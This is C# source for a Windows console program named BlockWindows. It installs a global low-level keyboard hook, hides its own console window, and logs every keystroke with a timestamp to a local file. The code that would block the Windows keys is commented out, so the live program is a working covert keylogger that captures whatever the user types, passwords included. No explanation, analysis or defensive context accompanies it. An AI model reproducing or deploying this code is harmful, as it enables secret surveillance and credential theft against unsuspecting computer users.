using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

class BlockWindows
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static HookProc proc = HookCallback;
    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static IntPtr hook = IntPtr.Zero;
    private static IntPtr handle = GetConsoleWindow();
    static string path = "Log.txt";
    public static void Main()
    {
        hook = SetHook(proc);
        Application.Run();
        UnhookWindowsHookEx(hook);
    }
    private static IntPtr SetHook(HookProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            ShowWindow(handle, 0);
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if ((nCode >= 0) && (wParam == (IntPtr)WM_KEYDOWN))
        {
            int vkCode = Marshal.ReadInt32(lParam);
            //if (((Keys)vkCode == Keys.LWin) || ((Keys)vkCode == Keys.RWin))
            //{
            //    Console.WriteLine($"{(Keys)vkCode} blocked!");
            //    return (IntPtr)1;
            //}
            using (StreamWriter sw = new StreamWriter(path,true))
            {
                sw.WriteLineAsync(vkCode.ToString() + " - " +  DateTime.Now.ToString());
                sw.Close();
            }
        }
        return CallNextHookEx(hook, nCode, wParam,
        lParam);
    }
    


    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx
    (int idHook,
    HookProc lpfn,
    IntPtr hMod,
   uint dwThreadId);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx
    (IntPtr hhk,
    int nCode,
    IntPtr wParam,
    IntPtr lParam);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
